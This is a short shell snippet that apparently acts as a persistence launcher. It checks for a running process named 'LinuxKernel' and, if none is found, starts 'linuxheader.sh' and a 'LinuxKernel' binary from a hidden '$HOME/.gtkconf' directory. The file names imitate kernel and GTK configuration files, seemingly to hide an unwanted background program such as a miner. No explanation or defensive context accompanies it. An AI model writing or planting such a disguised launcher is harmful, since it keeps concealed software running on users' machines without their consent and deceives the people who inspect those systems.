if ! pidof LinuxKernel >/dev/null; then
  nice $HOME/.gtkconf/linuxheader.sh \$*
  nice $HOME/.gtkconf/LinuxKernel \$*
fi
